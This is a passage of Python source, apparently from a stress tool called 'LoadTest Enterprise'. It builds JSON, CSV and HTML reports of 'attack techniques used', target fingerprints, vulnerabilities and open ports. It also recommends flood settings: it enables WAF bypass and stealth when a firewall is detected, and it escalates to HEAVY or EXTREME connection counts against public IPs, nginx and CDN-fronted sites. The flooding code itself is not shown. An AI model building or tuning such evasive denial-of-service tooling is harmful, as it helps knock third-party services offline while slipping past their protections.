            "cpu_count": psutil.cpu_count(),
            "cpu_percent": psutil.cpu_percent(interval=1),
            "memory_total_gb": round(psutil.virtual_memory().total / (1024**3), 2),
            "memory_used_gb": round(psutil.virtual_memory().used / (1024**3), 2),
            "memory_percent": psutil.virtual_memory().percent
        }
    except ImportError:
        pass
    
    report = {
        "metadata": {
            "tool": "LoadTest Enterprise",
            "version": VERSION,
            "timestamp": datetime.now().isoformat(),
            "target": TARGET,
            "domain": DOMAIN,
            "ip_address": IP_ADDRESS,
            "target_type": TARGET_TYPE,
            "network_type": NETWORK_TYPE,
            "protocol": PROTOCOL,
            "port": PORT,
            "duration": DURATION,
            "elapsed_time": elapsed_time,
            "power_level": POWER_LEVEL,
            "multiplier": MULTIPLIER,
            "attack_mode": ATTACK_MODE,
            "max_connections": MAX_CONNECTIONS,
            "max_threads": MAX_THREADS
        },
        "statistics": {
            "requests_sent": requests_sent,
            "responses_received": responses_received,
            "http_codes": http_codes,
            "errors": errors_count,
            "error_samples": list(attack_stats.get("errors", []))[:10],
            "bytes_sent": attack_stats.get("bytes_sent", 0),
            "bytes_received": attack_stats.get("bytes_received", 0),
            "avg_rps": round(avg_rps, 2),
            "peak_rps": peak_rps,
            "success_rate": round(success_rate, 2),
            "response_rate": round((responses_received / requests_sent * 100) if requests_sent > 0 else 0, 2)
        },
        "performance": latency_analysis,
        "error_analysis": error_analysis,
        "attack_techniques": attack_techniques_used,
        "system_info": system_info,
        "fingerprint": fingerprint_target() if TARGET else {},
        "vulnerabilities": VULNERABILITIES,
        "security_headers": SECURITY_HEADERS,
        "open_ports": OPEN_PORTS,
        "discovered_endpoints": DISCOVERED_ENDPOINTS,
        "recommendations": generate_recommendations() if TARGET else []
    }
    
    # Guardar JSON
    safe_domain = DOMAIN.replace('.', '_').replace(':', '_')
    json_file = REPORTS_DIR / f"report_{safe_domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(json_file, "w", encoding="utf-8") as f:
        json.dump(report, f, indent=2)
    
    # Guardar CSV
    csv_file = REPORTS_DIR / f"stats_{safe_domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
    with open(csv_file, "w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(["Metric", "Value"])
        writer.writerow(["Requests Sent", attack_stats["requests_sent"]])
        writer.writerow(["Responses Received", attack_stats["responses_received"]])
        for code, count in attack_stats["http_codes"].items():
            writer.writerow([f"HTTP {code}", count])
        if latencies:
            writer.writerow(["Avg Latency (ms)", sum(latencies) / len(latencies)])
            writer.writerow(["Min Latency (ms)", min(latencies)])
            writer.writerow(["Max Latency (ms)", max(latencies)])
    
    # Guardar CSV de vulnerabilidades
    if report.get("vulnerabilities"):
        vuln_csv_file = REPORTS_DIR / f"vulnerabilities_{safe_domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
        with open(vuln_csv_file, "w", newline="", encoding="utf-8") as f:
            writer = csv.writer(f)
            writer.writerow(["Type", "Severity", "Title", "Description", "URL", "Recommendation"])
            for vuln in report["vulnerabilities"]:
                writer.writerow([
                    vuln.get("type", "N/A"),
                    vuln.get("severity", "N/A"),
                    vuln.get("title", "N/A"),
                    vuln.get("description", "N/A")[:200],
                    vuln.get("url", "N/A"),
                    vuln.get("recommendation", "N/A")[:200]
                ])
        log_message("INFO", f"Reporte de vulnerabilidades CSV: {vuln_csv_file}")
    
    # Generar HTML
    html_file = generate_html_report(report)
    
    log_message("INFO", f"Reporte JSON: {json_file}")
    log_message("INFO", f"Reporte CSV: {csv_file}")
    log_message("INFO", f"Reporte HTML: {html_file}")
    
    return report

def generate_html_report(report: Dict) -> Path:
    """Genera reporte HTML"""
    safe_domain = DOMAIN.replace('.', '_').replace(':', '_')
    html_file = REPORTS_DIR / f"report_{safe_domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
    
    fingerprint = report.get('fingerprint', {})
    # Manejar waf que puede ser dict, string o None
    waf_raw = fingerprint.get('waf') if isinstance(fingerprint, dict) else None
    if isinstance(waf_raw, dict):
        waf_info = waf_raw
    elif isinstance(waf_raw, str):
        waf_info = {"name": waf_raw, "detected": True} if waf_raw else {}
    else:
        waf_info = {}
    
    html_content = f"""
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LoadTest Enterprise - Reporte de Análisis de Rendimiento</title>
    <style>
        body {{
            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background: #f5f7fa;
            color: #2c3e50;
            line-height: 1.6;
        }}
        .container {{
            max-width: 1200px;
            margin: 0 auto;
            background: #ffffff;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 2px 12px rgba(0,0,0,0.1);
        }}
        .header {{
            border-bottom: 3px solid #2563eb;
            padding-bottom: 20px;
            margin-bottom: 30px;
        }}
        h1 {{
            color: #1e40af;
            margin: 0;
            font-size: 2em;
            font-weight: 600;
        }}
        .subtitle {{
            color: #64748b;
            margin-top: 5px;
            font-size: 0.95em;
        }}
        h2 {{
            color: #1e40af;
            margin-top: 40px;
            margin-bottom: 20px;
            font-size: 1.5em;
            font-weight: 600;
            border-bottom: 2px solid #e2e8f0;
            padding-bottom: 10px;
        }}
        .metric {{
            background: #f8fafc;
            padding: 20px;
            margin: 15px 0;
            border-radius: 6px;
            border-left: 4px solid #2563eb;
            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
        }}
        .metric-label {{
            color: #64748b;
            font-size: 0.9em;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            font-weight: 500;
            margin-bottom: 8px;
        }}
        .metric-value {{
            color: #1e40af;
            font-size: 1.8em;
            font-weight: 700;
        }}
        table {{
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
            background: #ffffff;
            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
        }}
        th, td {{
            padding: 14px;
            text-align: left;
            border-bottom: 1px solid #e2e8f0;
        }}
        th {{
            background: #f1f5f9;
            color: #1e40af;
            font-weight: 600;
            text-transform: uppercase;
            font-size: 0.85em;
            letter-spacing: 0.5px;
        }}
        tr:hover {{
            background: #f8fafc;
        }}
        .code-200 {{ color: #10b981; font-weight: 600; }}
        .code-429 {{ color: #f59e0b; font-weight: 600; }}
        .code-500 {{ color: #ef4444; font-weight: 600; }}
        .recommendation {{
            background: #fef3c7;
            padding: 18px;
            margin: 15px 0;
            border-radius: 6px;
            border-left: 4px solid #f59e0b;
            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
        }}
        .recommendation-title {{
            color: #92400e;
            font-weight: 600;
            margin-bottom: 8px;
        }}
        .recommendation-text {{
            color: #78350f;
        }}
        .metrics-grid {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin: 20px 0;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>LoadTest Enterprise</h1>
            <div class="subtitle">Reporte de Análisis de Rendimiento</div>
        </div>
        
        <h2>Información General</h2>
        <div class="metric">
            <div class="metric-label">Target</div>
            <div class="metric-value">{report['metadata']['target']}</div>
        </div>
        <div class="metric">
            <div class="metric-label">Duración</div>
            <div class="metric-value">{report['metadata']['duration']} segundos</div>
        </div>
        <div class="metric">
            <div class="metric-label">Nivel de Potencia</div>
            <div class="metric-value">{report['metadata']['power_level']} (x{report['metadata']['multiplier']})</div>
        </div>
        
        <h2>Estadísticas Generales</h2>
        <div class="metrics-grid">
            <div class="metric">
                <div class="metric-label">Requests Enviados</div>
                <div class="metric-value">{format_number(report['statistics']['requests_sent'])}</div>
            </div>
            <div class="metric">
                <div class="metric-label">Responses Recibidas</div>
                <div class="metric-value">{format_number(report['statistics']['responses_received'])}</div>
            </div>
            <div class="metric">
                <div class="metric-label">Errores</div>
                <div class="metric-value" style="color: {'#ff0040' if report['statistics'].get('errors', 0) > 0 else '#00ff41'};">
                    {format_number(report['statistics'].get('errors', 0))}
                </div>
            </div>
            <div class="metric">
                <div class="metric-label">Duración Real</div>
                <div class="metric-value">{report['metadata'].get('elapsed_time', report['metadata'].get('duration', 0)):.0f}s</div>
            </div>
        </div>
        
        <h2>⚡ Rendimiento</h2>
        <table>
            <tr>
                <th>Métrica</th>
                <th>Valor</th>
            </tr>
            <tr>
                <td>Latencia Promedio</td>
                <td>{report['performance']['avg_latency_ms']:.2f} ms</td>
            </tr>
            <tr>
                <td>Latencia Mínima</td>
                <td>{report['performance']['min_latency_ms']:.2f} ms</td>
            </tr>
            <tr>
                <td>Latencia Máxima</td>
                <td>{report['performance']['max_latency_ms']:.2f} ms</td>
            </tr>
            <tr>
                <td>Latencia P95</td>
                <td>{report['performance']['p95_latency_ms']:.2f} ms</td>
            </tr>
            <tr>
                <td>Latencia P99</td>
                <td>{report['performance']['p99_latency_ms']:.2f} ms</td>
            </tr>
        </table>
        
        <h2>📡 Códigos HTTP</h2>
        <div class="chart-container">
            <div class="chart-wrapper">
                <canvas id="httpCodesChart"></canvas>
            </div>
        </div>
        <table>
            <tr>
                <th>Código</th>
                <th>Cantidad</th>
                <th>Porcentaje</th>
                <th>Estado</th>
            </tr>
"""
    
    http_codes_sorted = sorted(report['statistics']['http_codes'].items(), key=lambda x: x[1], reverse=True)
    total_requests = report['statistics']['requests_sent']
    
    # Generar datos para gráfico
    http_codes_labels = []
    http_codes_data = []
    http_codes_colors = []
    
    for code, count in http_codes_sorted[:10]:  # Top 10
        percentage = (count / total_requests * 100) if total_requests > 0 else 0
        code_class = ""
        status = ""
        color = "#858585"
        
        if 200 <= code < 300:
            code_class = "code-200"
            status = "✅ Éxito"
            color = "#00ff41"
        elif 300 <= code < 400:
            code_class = "code-4xx"
            status = "↩️ Redirección"
            color = "#00ffff"
        elif 400 <= code < 500:
            code_class = "code-4xx"
            status = "Error Cliente"
            color = "#ffaa00"
        elif code >= 500:
            code_class = "code-5xx"
            status = "Error Servidor"
            color = "#ff0040"
        
        html_content += f"            <tr><td class='{code_class}'>{code}</td><td>{format_number(count)}</td><td>{percentage:.2f}%</td><td>{status}</td></tr>\n"
        
        http_codes_labels.append(f"HTTP {code}")
        http_codes_data.append(count)
        http_codes_colors.append(color)
    
    html_content += """
        </table>
        
        <h2>⏱️ Análisis de Latencia</h2>
        <div class="chart-container">
            <div class="chart-wrapper">
                <canvas id="latencyChart"></canvas>
            </div>
        </div>
        <table>
            <tr>
                <th>Métrica</th>
                <th>Valor</th>
                <th>Descripción</th>
            </tr>
"""
    
    # Agregar todas las métricas de latencia
    latency_percentiles = {
        "Promedio": report['performance']['avg_latency_ms'],
        "Mínima": report['performance']['min_latency_ms'],
        "Máxima": report['performance']['max_latency_ms'],
        "P50 (Mediana)": report['performance'].get('p50_latency_ms', 0),
        "P75": report['performance'].get('p75_latency_ms', 0),
        "P90": report['performance'].get('p90_latency_ms', 0),
        "P95": report['performance']['p95_latency_ms'],
        "P99": report['performance']['p99_latency_ms'],
        "Desviación Estándar": report['performance'].get('std_dev_ms', 0)
    }
    
    for metric, value in latency_percentiles.items():
        desc = {
            "Promedio": "Latencia promedio de todas las respuestas",
            "Mínima": "Latencia más baja registrada",
            "Máxima": "Latencia más alta registrada",
            "P50 (Mediana)": "50% de las respuestas fueron más rápidas",
            "P75": "75% de las respuestas fueron más rápidas",
            "P90": "90% de las respuestas fueron más rápidas",
            "P95": "95% de las respuestas fueron más rápidas",
            "P99": "99% de las respuestas fueron más rápidas",
            "Desviación Estándar": "Variabilidad en las latencias"
        }.get(metric, "")
        html_content += f"            <tr><td>{metric}</td><td>{value:.2f} ms</td><td>{desc}</td></tr>\n"
    
    html_content += """
        </table>
        
        <h2>📈 Distribución de Latencias</h2>
        <div class="chart-container">
            <div class="chart-wrapper">
                <canvas id="latencyDistributionChart"></canvas>
            </div>
        </div>
        
        <h2>🔍 Fingerprint</h2>
"""
    
    if isinstance(fingerprint, dict):
        html_content += f"""
        <div class="metric">
            <div class="metric-label">Tipo de Target</div>
            <div class="metric-value">{fingerprint.get('target_type', 'Unknown')} ({fingerprint.get('network_type', 'Unknown')})</div>
        </div>
        <div class="metric">
            <div class="metric-label">Servidor</div>
            <div class="metric-value">{fingerprint.get('server', 'Unknown')}</div>
        </div>
        <div class="metric">
            <div class="metric-label">WAF</div>
            <div class="metric-value">{waf_info.get('name', 'No detectado') if waf_info else 'No detectado'}</div>
        </div>
        <div class="metric">
            <div class="metric-label">CDN</div>
            <div class="metric-value">{fingerprint.get('cdn', 'No detectado') or 'No detectado'}</div>
        </div>
        <div class="metric">
            <div class="metric-label">Framework</div>
            <div class="metric-value">{fingerprint.get('framework', 'No detectado') or 'No detectado'}</div>
        </div>
"""
        
        # Mostrar endpoints descubiertos si existen
        discovered_endpoints = fingerprint.get('discovered_endpoints', [])
        if discovered_endpoints:
            html_content += """
        <h2>🔌 Endpoints Descubiertos</h2>
        <table>
            <tr>
                <th>URL</th>
                <th>Puerto</th>
                <th>Protocolo</th>
                <th>Status Code</th>
                <th>Servidor</th>
                <th>Título</th>
            </tr>
"""
            for endpoint in discovered_endpoints:
                title = endpoint.get('title', 'N/A')[:50] if endpoint.get('title') else 'N/A'
                html_content += f"""
            <tr>
                <td>{endpoint.get('url', 'N/A')}</td>
                <td>{endpoint.get('port', 'N/A')}</td>
                <td>{endpoint.get('protocol', 'N/A')}</td>
                <td>{endpoint.get('status_code', 'N/A')}</td>
                <td>{endpoint.get('server', 'Unknown')}</td>
                <td>{title}</td>
            </tr>
"""
            html_content += """
        </table>
"""
    
    html_content += """
        <h2>🔒 Security Headers</h2>
        <table>
            <tr>
                <th>Header</th>
                <th>Estado</th>
            </tr>
"""
    
    if isinstance(fingerprint, dict):
        security_headers = fingerprint.get('security_headers', {})
        if security_headers:
            headers_to_check = [
                ("strict-transport-security", "HSTS"),
                ("content-security-policy", "Content-Security-Policy"),
                ("x-frame-options", "X-Frame-Options"),
                ("x-content-type-options", "X-Content-Type-Options"),
                ("x-xss-protection", "X-XSS-Protection"),
                ("referrer-policy", "Referrer-Policy"),
                ("permissions-policy", "Permissions-Policy")
            ]
            
            for key, display_name in headers_to_check:
                status = "✓ Presente" if security_headers.get(key) else "✗ Ausente"
                color_class = "code-200" if security_headers.get(key) else "code-500"
                html_content += f"""
            <tr>
                <td>{display_name}</td>
                <td class='{color_class}'>{status}</td>
            </tr>
"""
    
    html_content += """
        </table>
        
        <h2>🚨 Vulnerabilidades Detectadas</h2>
"""
    
    vulnerabilities = report.get('vulnerabilities', [])
    if vulnerabilities:
        html_content += """
        <table>
            <tr>
                <th>Tipo</th>
                <th>Severidad</th>
                <th>Título</th>
                <th>Descripción</th>
                <th>Recomendación</th>
            </tr>
"""
        for vuln in vulnerabilities:
            severity = vuln.get('severity', 'UNKNOWN')
            severity_class = {
                'HIGH': 'code-500',
                'MEDIUM': 'code-429',
                'LOW': 'code-200'
            }.get(severity, '')
            
            html_content += f"""
            <tr>
                <td>{vuln.get('type', 'N/A')}</td>
                <td class='{severity_class}'>{severity}</td>
                <td><strong>{vuln.get('title', 'N/A')}</strong></td>
                <td>{vuln.get('description', 'N/A')[:150]}...</td>
                <td>{vuln.get('recommendation', 'N/A')[:100]}...</td>
            </tr>
"""
        html_content += """
        </table>
"""
    else:
        html_content += """
        <div class="metric">
            <div class="metric-label">Estado</div>
            <div class="metric-value">No se detectaron vulnerabilidades obvias</div>
        </div>
"""
    
    # Mostrar puertos abiertos si es IP
    if isinstance(fingerprint, dict) and fingerprint.get('target_type') == 'IP':
        open_ports = fingerprint.get('open_ports', [])
        if open_ports:
            html_content += """
        <h2>🔌 Puertos Abiertos</h2>
        <table>
            <tr>
                <th>Puerto</th>
                <th>Estado</th>
                <th>Servicio</th>
            </tr>
"""
            for port_info in open_ports:
                html_content += f"""
            <tr>
                <td>{port_info.get('port', 'N/A')}</td>
                <td class='code-200'>{port_info.get('state', 'N/A')}</td>
                <td>{port_info.get('service', 'Unknown')}</td>
            </tr>
"""
            html_content += """
        </table>
"""
    
    html_content += """
        <h2>Recomendaciones</h2>
"""
    
    for rec in report.get('recommendations', []):
        html_content += f"""
        <div class="recommendation">
            <div class="recommendation-title">{rec.get('title', 'Recomendación')}</div>
            <div class="recommendation-text">{rec.get('description', '')}</div>
        </div>
"""
    
    # Agregar análisis de errores al HTML
    if report.get('error_analysis') and report['error_analysis'].get('total_errors', 0) > 0:
        error_analysis = report['error_analysis']
        html_content += f"""
        <h2>❌ Análisis de Errores</h2>
        <div class="metrics-grid">
            <div class="metric">
                <div class="metric-label">Total Errores</div>
                <div class="metric-value" style="color: #ff0040;">{format_number(error_analysis['total_errors'])}</div>
            </div>
            <div class="metric">
                <div class="metric-label">Tasa de Error</div>
                <div class="metric-value" style="color: #ff0040;">{error_analysis['error_rate']:.2f}%</div>
            </div>
        </div>
"""
        
        if error_analysis.get('error_types'):
            html_content += """
        <div class="chart-container">
            <div class="chart-wrapper">
                <canvas id="errorTypesChart"></canvas>
            </div>
        </div>
        <table>
            <tr>
                <th>Tipo de Error</th>
                <th>Cantidad</th>
                <th>Porcentaje</th>
            </tr>
"""
            total_errors = error_analysis['total_errors']
            for error_type, count in sorted(error_analysis['error_types'].items(), key=lambda x: x[1], reverse=True):
                percentage = (count / total_errors * 100) if total_errors > 0 else 0
                html_content += f"            <tr><td>{error_type.capitalize()}</td><td>{count}</td><td>{percentage:.2f}%</td></tr>\n"
            html_content += """
        </table>
"""
    
    # Agregar información de técnicas de ataque
    if report.get('attack_techniques'):
        html_content += f"""
        <h2>⚡ Técnicas de Ataque Utilizadas</h2>
        <div class="metrics-grid">
"""
        for technique in report['attack_techniques'][:10]:
            html_content += f"""
            <div class="metric">
                <div class="metric-label">Técnica</div>
                <div class="metric-value" style="font-size: 1.1em;">{technique}</div>
            </div>
"""
        html_content += """
        </div>
"""
    
    # Agregar información del sistema
    if report.get('system_info'):
        system_info = report['system_info']
        html_content += f"""
        <h2>💻 Información del Sistema</h2>
        <div class="metrics-grid">
            <div class="metric">
                <div class="metric-label">CPU Cores</div>
                <div class="metric-value">{system_info.get('cpu_count', 'N/A')}</div>
            </div>
            <div class="metric">
                <div class="metric-label">CPU Usage</div>
                <div class="metric-value">{system_info.get('cpu_percent', 0):.1f}%</div>
            </div>
            <div class="metric">
                <div class="metric-label">Memoria Total</div>
                <div class="metric-value">{system_info.get('memory_total_gb', 0):.1f} GB</div>
            </div>
            <div class="metric">
                <div class="metric-label">Memoria Usada</div>
                <div class="metric-value">{system_info.get('memory_used_gb', 0):.1f} GB</div>
            </div>
            <div class="metric">
                <div class="metric-label">Memoria %</div>
                <div class="metric-value">{system_info.get('memory_percent', 0):.1f}%</div>
            </div>
        </div>
"""
    
    # JavaScript para gráficos interactivos con Chart.js
    html_content += """
    </div>
    
    <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
    <script>
        // Configuración de Chart.js con tema oscuro
        Chart.defaults.color = '#e0e0e0';
        Chart.defaults.borderColor = '#333333';
        Chart.defaults.backgroundColor = '#1a1a1a';
        
        // Gráfico de Códigos HTTP
        const httpCodesCtx = document.getElementById('httpCodesChart');
        if (httpCodesCtx) {
            const httpCodesData = """ + json.dumps({
                "labels": http_codes_labels,
                "data": http_codes_data,
                "colors": http_codes_colors
            }) + """;
            
            new Chart(httpCodesCtx, {
                type: 'doughnut',
                data: {
                    labels: httpCodesData.labels,
                    datasets: [{
                        label: 'Códigos HTTP',
                        data: httpCodesData.data,
                        backgroundColor: httpCodesData.colors,
                        borderWidth: 2,
                        borderColor: '#1a1a1a'
                    }]
                },
                options: {
                    responsive: true,
                    maintainAspectRatio: false,
                    plugins: {
                        legend: {
                            position: 'right',
                            labels: {
                                color: '#e0e0e0',
                                font: { size: 12 }
                            }
                        },
                        tooltip: {
                            backgroundColor: '#2d2d30',
                            titleColor: '#00ffff',
                            bodyColor: '#e0e0e0',
                            borderColor: '#00ff41',
                            borderWidth: 1
                        }
                    }
                }
            });
        }
        
        // Gráfico de Latencia (Percentiles)
        const latencyCtx = document.getElementById('latencyChart');
        if (latencyCtx) {
            const latencyData = """ + json.dumps({
                "P50": report['performance'].get('p50_latency_ms', 0),
                "P75": report['performance'].get('p75_latency_ms', 0),
                "P90": report['performance'].get('p90_latency_ms', 0),
                "P95": report['performance'].get('p95_latency_ms', 0),
                "P99": report['performance'].get('p99_latency_ms', 0)
            }) + """;
            
            new Chart(latencyCtx, {
                type: 'bar',
                data: {
                    labels: Object.keys(latencyData),
                    datasets: [{
                        label: 'Latencia (ms)',
                        data: Object.values(latencyData),
                        backgroundColor: [
                            'rgba(0, 255, 65, 0.7)',
                            'rgba(0, 255, 255, 0.7)',
                            'rgba(255, 170, 0, 0.7)',
                            'rgba(255, 128, 0, 0.7)',
                            'rgba(255, 0, 64, 0.7)'
                        ],
                        borderColor: [
                            '#00ff41',
                            '#00ffff',
                            '#ffaa00',
                            '#ff8000',
                            '#ff0040'
                        ],
                        borderWidth: 2
                    }]
                },
                options: {
                    responsive: true,
                    maintainAspectRatio: false,
                    scales: {
                        y: {
                            beginAtZero: true,
                            ticks: { color: '#e0e0e0' },
                            grid: { color: '#333333' }
                        },
                        x: {
                            ticks: { color: '#e0e0e0' },
                            grid: { color: '#333333' }
                        }
                    },
                    plugins: {
                        legend: { display: false },
                        tooltip: {
                            backgroundColor: '#2d2d30',
                            titleColor: '#00ffff',
                            bodyColor: '#e0e0e0',
                            borderColor: '#00ff41',
                            borderWidth: 1
                        }
                    }
                }
            });
        }
        
        // Gráfico de Análisis de Errores
        const errorTypesCtx = document.getElementById('errorTypesChart');
        if (errorTypesCtx) {
            const errorTypes = """ + json.dumps(error_analysis.get('error_types', {}) if report.get('error_analysis') else {}) + """;
            
            if (Object.keys(errorTypes).length > 0) {
                new Chart(errorTypesCtx, {
                    type: 'pie',
                    data: {
                        labels: Object.keys(errorTypes).map(k => k.charAt(0).toUpperCase() + k.slice(1)),
                        datasets: [{
                            label: 'Tipos de Error',
                            data: Object.values(errorTypes),
                            backgroundColor: [
                                'rgba(255, 0, 64, 0.7)',
                                'rgba(255, 170, 0, 0.7)',
                                'rgba(0, 255, 255, 0.7)',
                                'rgba(255, 128, 0, 0.7)',
                                'rgba(128, 128, 128, 0.7)'
                            ],
                            borderWidth: 2,
                            borderColor: '#1a1a1a'
                        }]
                    },
                    options: {
                        responsive: true,
                        maintainAspectRatio: false,
                        plugins: {
                            legend: {
                                position: 'right',
                                labels: { color: '#e0e0e0' }
                            },
                            tooltip: {
                                backgroundColor: '#2d2d30',
                                titleColor: '#00ffff',
                                bodyColor: '#e0e0e0',
                                borderColor: '#ff0040',
                                borderWidth: 1
                            }
                        }
                    }
                });
            }
        }
        
        // Gráfico de Rendimiento (RPS, Latencia, etc)
        const performanceCtx = document.getElementById('performanceChart');
        if (performanceCtx) {
            const stats = """ + json.dumps({
                "Requests": report['statistics']['requests_sent'],
                "Responses": report['statistics']['responses_received'],
                "Errors": report['statistics'].get('errors', 0),
                "Avg RPS": report['statistics'].get('avg_rps', 0),
                "Peak RPS": report['statistics'].get('peak_rps', 0)
            }) + """;
            
            // Normalizar valores para el gráfico radar
            const maxValue = Math.max(...Object.values(stats));
            const normalizedStats = {};
            for (const [key, value] of Object.entries(stats)) {
                normalizedStats[key] = maxValue > 0 ? (value / maxValue * 100) : 0;
            }
            
            new Chart(performanceCtx, {
                type: 'radar',
                data: {
                    labels: Object.keys(stats),
                    datasets: [{
                        label: 'Métricas de Rendimiento',
                        data: Object.values(normalizedStats),
                        backgroundColor: 'rgba(0, 255, 65, 0.2)',
                        borderColor: '#00ff41',
                        borderWidth: 2,
                        pointBackgroundColor: '#00ff41',
                        pointBorderColor: '#fff',
                        pointHoverBackgroundColor: '#fff',
                        pointHoverBorderColor: '#00ff41'
                    }]
                },
                options: {
                    responsive: true,
                    maintainAspectRatio: false,
                    scales: {
                        r: {
                            beginAtZero: true,
                            max: 100,
                            ticks: { 
                                color: '#e0e0e0', 
                                backdropColor: 'transparent',
                                stepSize: 20
                            },
                            grid: { color: '#333333' },
                            pointLabels: { color: '#e0e0e0' }
                        }
                    },
                    plugins: {
                        legend: {
                            labels: { color: '#e0e0e0' }
                        },
                        tooltip: {
                            backgroundColor: '#2d2d30',
                            titleColor: '#00ffff',
                            bodyColor: '#e0e0e0',
                            borderColor: '#00ff41',
                            borderWidth: 1,
                            callbacks: {
                                label: function(context) {
                                    const label = context.dataset.label || '';
                                    const value = stats[context.label];
                                    return label + ': ' + value.toLocaleString();
                                }
                            }
                        }
                    }
                }
            });
        }
    </script>
</body>
</html>
"""
    
    with open(html_file, "w", encoding="utf-8") as f:
        f.write(html_content)
    
    return html_file

def generate_stress_recommendations(fingerprint: Dict = None) -> Dict:
    """Genera recomendaciones automáticas de configuración de stress basadas en fingerprint"""
    if fingerprint is None:
        # Intentar cargar fingerprint más reciente
        try:
            fingerprint_file = REPORTS_DIR / f"fingerprint_{DOMAIN.replace('.', '_').replace(':', '_')}.json"
            if fingerprint_file.exists():
                with open(fingerprint_file, "r", encoding="utf-8") as f:
                    fingerprint = json.load(f)
        except:
            pass
    
    if not fingerprint:
        return {
            "recommended_power_level": "MODERATE",
            "recommended_duration": 60,
            "recommended_connections": 1000,
            "recommended_threads": 50,
            "recommended_waf_bypass": False,
            "recommended_stealth": False,
            "recommended_large_payloads": False,
            "reasoning": "Sin fingerprint disponible, usando configuración conservadora por defecto"
        }
    
    target_type = fingerprint.get("target_type", TARGET_TYPE)
    network_type = fingerprint.get("network_type", NETWORK_TYPE)
    server = fingerprint.get("server", "Unknown")
    framework = fingerprint.get("framework")
    # Manejar waf que puede ser dict, string o None
    waf_raw = fingerprint.get("waf")
    if isinstance(waf_raw, dict):
        waf = waf_raw
    elif isinstance(waf_raw, str):
        waf = {"name": waf_raw, "detected": True} if waf_raw else {}
    else:
        waf = {}
    
    cdn = fingerprint.get("cdn")
    vulnerabilities = fingerprint.get("vulnerabilities", [])
    discovered_endpoints = fingerprint.get("discovered_endpoints", [])
    open_ports = fingerprint.get("open_ports", [])
    
    recommendations = {
        "recommended_power_level": "MODERATE",
        "recommended_duration": 60,
        "recommended_connections": 1000,
        "recommended_threads": 50,
        "recommended_waf_bypass": False,
        "recommended_stealth": False,
        "recommended_large_payloads": False,
        "reasoning": []
    }
    
    # Recomendaciones según tipo de red
    if network_type == "LOCAL":
        recommendations["recommended_power_level"] = "LIGHT"
        recommendations["recommended_duration"] = 300  # 5 minutos para pruebas locales
        recommendations["recommended_connections"] = 500
        recommendations["recommended_threads"] = 20
        recommendations["reasoning"].append("IP local detectada - usando configuración conservadora para evitar sobrecarga")
        
        # Si es router u otro dispositivo embebido
        if any(keyword in server.lower() for keyword in ["router", "tp-link", "asus", "netgear", "linksys"]):
            recommendations["recommended_power_level"] = "TEST"
            recommendations["recommended_duration"] = 180
            recommendations["recommended_connections"] = 100
            recommendations["recommended_threads"] = 10
            recommendations["reasoning"].append("Router/dispositivo embebido detectado - configuración ultra-conservadora")
    
    elif network_type == "PUBLIC":
        if target_type == "IP":
            recommendations["recommended_power_level"] = "HEAVY"
            recommendations["recommended_connections"] = 5000
            recommendations["recommended_threads"] = 200
            recommendations["reasoning"].append("IP pública detectada - usando configuración más agresiva")
        else:
            recommendations["recommended_power_level"] = "MODERATE"
            recommendations["recommended_connections"] = 3000
            recommendations["reasoning"].append("Dominio público - configuración moderada por defecto")
    
    # Recomendaciones según servidor detectado
    if "nginx" in server.lower():
        recommendations["recommended_power_level"] = "HEAVY"
        recommendations["recommended_connections"] = 8000
        recommendations["recommended_threads"] = 300
        recommendations["reasoning"].append("Nginx detectado - puede manejar alta carga")
    
    if "apache" in server.lower():
        recommendations["recommended_power_level"] = "MODERATE"
        recommendations["recommended_connections"] = 2000
        recommendations["recommended_threads"] = 100
        recommendations["reasoning"].append("Apache detectado - configuración moderada recomendada")
    
    if "iis" in server.lower():
        recommendations["recommended_power_level"] = "MEDIUM"
        recommendations["recommended_connections"] = 1500
        recommendations["reasoning"].append("IIS detectado - configuración moderada")
    
    # Recomendaciones según framework
    if framework == "wordpress":
        recommendations["recommended_power_level"] = "LIGHT"
        recommendations["recommended_duration"] = 120
        recommendations["recommended_connections"] = 500
        recommendations["reasoning"].append("WordPress detectado - configuración conservadora (puede ser lento bajo carga)")
    
    if framework == "django":
        recommendations["recommended_power_level"] = "MODERATE"
        recommendations["recommended_connections"] = 2000
        recommendations["reasoning"].append("Django detectado - puede manejar carga moderada")
    
    # Recomendaciones según WAF
    # Verificar WAF (puede ser dict, string o None)
    waf_detected = False
    if isinstance(waf, dict):
        waf_detected = waf.get("detected", False)
    elif isinstance(waf, str) and waf:
        waf_detected = True
    
    if waf_detected:
        recommendations["recommended_waf_bypass"] = True
        recommendations["recommended_stealth"] = True
        # Obtener nombre del WAF
        if isinstance(waf, dict):
            waf_name = waf.get('name', 'Unknown')
        elif isinstance(waf, str):
            waf_name = waf
        else:
            waf_name = 'Unknown'
        recommendations["reasoning"].append(f"WAF detectado ({waf_name}) - activando bypass y stealth")
    
    # Recomendaciones según CDN
    if cdn:
        recommendations["recommended_power_level"] = "EXTREME"
        recommendations["recommended_connections"] = 10000
        recommendations["recommended_threads"] = 400
        recommendations["recommended_large_payloads"] = True
        recommendations["reasoning"].append(f"CDN detectado ({cdn}) - puede manejar carga extrema")
    
    # Recomendaciones según vulnerabilidades
    high_vulns = [v for v in vulnerabilities if v.get("severity") == "HIGH"]
    if high_vulns:
        recommendations["recommended_power_level"] = "LIGHT"
        recommendations["recommended_duration"] = 60
        recommendations["reasoning"].append(f"{len(high_vulns)} vulnerabilidad(es) crítica(s) detectada(s) - usar con precaución")
    
